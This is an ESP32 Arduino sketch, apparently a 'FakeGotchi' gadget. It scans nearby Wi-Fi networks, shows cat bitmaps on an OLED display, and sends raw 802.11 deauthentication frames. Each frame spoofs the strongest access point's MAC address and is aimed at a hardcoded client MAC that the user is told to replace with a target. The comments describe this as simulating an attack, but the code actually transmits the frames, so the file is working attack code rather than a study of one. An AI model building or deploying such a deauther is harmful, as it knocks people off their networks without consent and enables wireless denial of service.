#include <Adafruit_GFX.h>
#include <Wire.h>
#include <WiFi.h>
#include <Adafruit_SSD1306.h>
#include "bitmaps.h"
#include "esp_wifi.h"

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// Dynamic set MAC address of Access Point
uint8_t ap_mac[6];  // This will be filled with the strongest target MAC

// MAC address of client (set as TP-Link Device to fool)
uint8_t client_mac[6] = {0x10, 0xFE, 0xED, 0xC9, 0x2B, 0x17};  // Replace with your target MAC address

void sendDeauthPacket(uint8_t *target_mac, uint8_t *source_mac, uint8_t channel) {
  uint8_t deauthPacket[26] = {
      0xC0, 0x00, 0x3A, 0x01, // Frame Control ->0xC0, Addressing Fields (Third Byte - 0x3A), Reason Code (Fourth Byte - 0x01)
      target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5],  // Target MAC
      source_mac[0], source_mac[1], source_mac[2], source_mac[3], source_mac[4], source_mac[5],  // Source MAC
      source_mac[0], source_mac[1], source_mac[2], source_mac[3], source_mac[4], source_mac[5],  // BSSID
      0x00, 0x00,                               // Sequence Control
      0x07, 0x00                                // Reason Code: Class 3 frame received from nonassociated STA
  };

  // Set Wi-Fi to the correct channel
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

  // Send Deauth packet using raw 802.11 frame transmission
  esp_wifi_80211_tx(WIFI_IF_MONITOR, deauthPacket, sizeof(deauthPacket), false);
  Serial.println("Deauth packet sent.");
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_STA); 
  WiFi.disconnect();   
  delay(100);          
  Serial.println("Ready to scan WiFi networks...");

  // Initialize display
  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  display.clearDisplay();
  display.setCursor(0, 30);
  display.print("Status : Display OK !");
  display.display();
  delay(1000);

  // Display "FakeGotchiV1" 3 times
  for (int i = 0; i < 3; i++) {
    display.clearDisplay();
    display.drawBitmap(0, 0, FakeGotchiV1, 128, 64, WHITE);  // Display FakeGotchiV1 image
    display.display();
    delay(800);
    display.clearDisplay();
  }

  // Set Wi-Fi to monitor mode for sending raw frames
  esp_wifi_set_mode(WIFI_MODE_MONITOR);
}

void loop() {
  WiFiScan();  // Start scanning Wi-Fi networks

  // Wait 10 seconds before rescanning
  delay(10000);
}

void WiFiScan() {
  Serial.println("\nScanning Wi-Fi networks...");
  display.clearDisplay();
  display.drawBitmap(0, 0, KittyHAPPY, 128, 64, WHITE);  // Display KittyHAPPY during scan
  display.display();

  int n = WiFi.scanNetworks();  // Scan for Wi-Fi networks

  if (n == 0) {
    Serial.println("No networks found.");
  } else {
    Serial.printf("Found %d networks\n", n);
    
    int strongestRSSI = -100;  // Set initial weak RSSI value
    String strongestSSID = "";
    String strongestBSSID = "";
    uint8_t strongestChannel = 0;

    for (int i = 0; i < n; i++) {
      // Convert MAC address to string
      String bssidStr = "";
      const uint8_t *bssid = WiFi.BSSID(i);
      for (int j = 0; j < 6; j++) {
        if (j > 0) bssidStr += ":";
        bssidStr += String(bssid[j], HEX);
      }

      // Check if the network is hidden
      String hiddenStatus = WiFi.SSID(i).isEmpty() ? "Yes" : "No";

      // Print SSID, MAC, RSSI, and hidden status
      Serial.printf("%d: SSID: %s, MAC: %s, RSSI: %d dBm, Hidden: %s\n", 
                    i + 1, 
                    WiFi.SSID(i).c_str(), 
                    bssidStr.c_str(), 
                    WiFi.RSSI(i), 
                    hiddenStatus.c_str());

      // Find the strongest network based on RSSI
      if (WiFi.RSSI(i) > strongestRSSI) {
        strongestRSSI = WiFi.RSSI(i);
        strongestSSID = WiFi.SSID(i);
        strongestBSSID = bssidStr;
        strongestChannel = WiFi.channel(i);

        // Store the MAC address of the strongest network
        memcpy(ap_mac, bssid, 6);
      }
    }

    // Print information about the strongest network
    Serial.println("\nStrongest Wi-Fi network:");
    Serial.printf("SSID: %s, MAC: %s, RSSI: %d dBm, Channel: %d\n", 
                  strongestSSID.c_str(), 
                  strongestBSSID.c_str(), 
                  strongestRSSI, 
                  strongestChannel);

    // Simulate sending deauthentication packets to the target
    Serial.println("Sending Deauth packets...");
    sendDeauthPacket(client_mac, ap_mac, strongestChannel);  // Send deauth packet to client
    delay(5000);  // Simulate Deauth attack for 5 seconds
  }

  // Clear the display after scan and deauth
  display.clearDisplay();
  display.display();
}
